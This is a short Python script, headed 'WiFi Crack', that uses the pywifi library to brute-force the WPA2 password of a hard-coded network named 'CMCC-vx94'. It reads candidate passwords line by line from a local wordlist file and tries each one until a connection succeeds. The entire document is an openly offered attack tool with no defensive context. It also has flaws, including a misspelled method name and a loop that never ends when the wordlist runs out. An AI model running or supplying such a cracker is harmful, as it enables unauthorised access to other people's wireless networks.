import pywifi
from pywifi import const
import time
import datetime

def wifiConnect(pwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interface()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = "CMCC-vx94"
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append (const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        ifaces.removed_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(2)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print ("WIFI already connected")




def readPassword():
    success = False
    print("*********** WiFi Crack ****************")
    path = "pwd.txt"
    file = open (path, "r")
    start = datetime.datetime.now()

    while True:
        try:
            pwd = file.readline()
            pwd = pwd.strip('\n')
            bool = wifiConnect(pwd)
            if bool:
                print ("[*] Password crashed ", pwd)
                print ("[*] Wi-Fi connected!!!")
                success = True
                break
            else:
                print ("working hard on it")
        except:
            continue
    end = datetime.datetime.now()
    if (success):
        print("job is done with: {}".format(end - start))
    else:
        print("cannot complete")
    exit (0)

if __name__=="__main__":
    readPassword()